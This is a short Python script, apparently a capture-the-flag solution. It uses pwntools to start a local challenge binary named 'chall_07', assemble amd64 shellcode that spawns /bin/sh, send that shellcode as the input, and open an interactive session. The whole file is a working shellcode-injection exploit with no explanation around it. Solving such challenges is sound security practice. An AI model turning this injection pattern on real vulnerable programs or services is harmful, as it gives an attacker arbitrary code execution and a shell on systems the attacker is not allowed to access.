from pwn import *
p=process("./chall_07")
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = b"" + shellcode
p.sendline(payload)
p.interactive()
